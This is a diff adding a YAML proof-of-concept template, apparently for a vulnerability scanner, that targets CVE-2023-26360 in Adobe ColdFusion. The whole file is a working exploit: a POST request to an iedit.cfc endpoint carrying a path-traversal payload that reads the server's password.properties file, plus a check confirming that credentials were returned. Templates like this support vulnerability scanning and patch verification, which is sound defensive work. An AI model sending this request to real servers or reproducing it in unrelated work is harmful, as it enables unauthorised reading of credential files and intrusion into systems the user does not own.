@@ -1,0 +1,19 @@
+id: poc-yaml-adobe-coldfusion-unauth-file-read
+info:
+  name: Adobe ColdFusion 任意文件读取
+  severity: high
+  tags:
+  - CVE-2023-26360
+  - 两高一弱
+  finger: Adobe ColdFusion
+requests:
+- method: POST
+  path: /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=wizardHash&_cfclient=true&returnFormat=wddx&inPassword=foo
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: _variables=%7b%22_metadata%22%3a%7b%22classname%22%3a%22i/../lib/password.properties%22%7d%2c%22_variables%22%3a%5b%5d%7d
+  expression: "status_code == 200 && contains(body, \"password=\") && contains(body,\
+    \ \"encrypted=\") &&\n ( contains(body, \"adobe\") || contains(body, \"coldfusion\"\
+    ) )\n"
+variables: {}
+transport: http
